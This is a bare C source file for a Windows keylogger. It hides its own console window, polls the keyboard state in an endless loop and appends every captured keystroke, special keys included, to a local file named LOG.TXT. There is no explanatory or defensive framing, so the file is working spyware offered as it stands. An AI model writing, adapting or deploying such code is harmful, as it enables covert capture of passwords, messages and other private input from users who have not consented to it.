#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

void stealth()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

int save(int keystroke, char* file)
{
    if ((keystroke == 1) || (keystroke == 2)) return 0;
    FILE* outputFile;
    outputFile = fopen(file, "a+");

    switch (keystroke) {
    case 8: fprintf(outputFile, "%s", "[BACKSPACE]"); break;
    case 13: fprintf(outputFile, "%s", "\n"); break;
    case 32: fprintf(outputFile, "%s", " "); break;
    case VK_TAB: fprintf(outputFile, "%s", "[TAB]"); break;
    case VK_SHIFT: fprintf(outputFile, "%s", "[SHIFT]"); break;
    case VK_CONTROL: fprintf(outputFile, "%s", "[CONTROL]"); break;
    case VK_ESCAPE: fprintf(outputFile, "%s", "[ESCAPE]"); break;
    case VK_END: fprintf(outputFile, "%s", "[END]"); break;
    case VK_HOME: fprintf(outputFile, "%s", "[HOME]"); break;
    case VK_LEFT: fprintf(outputFile, "%s", "[LEFT]"); break;
    case VK_UP: fprintf(outputFile, "%s", "[UP]"); break;
    case VK_RIGHT: fprintf(outputFile, "%s", "[RIGHT]"); break;
    case VK_DOWN: fprintf(outputFile, "%s", "[DOWN]"); break;
    case 190: case 110: fprintf(outputFile, "%s", "."); break;
    default: fprintf(outputFile, "%c", keystroke);
    }
    fclose(outputFile);
    return 0;
}

int main()
{
    stealth();
    char i;

    while (1)
        for (i = 0; i <= 191; i++)
            if (GetAsyncKeyState(i) == -32767) save(i, "LOG.TXT");

    return 0;
}
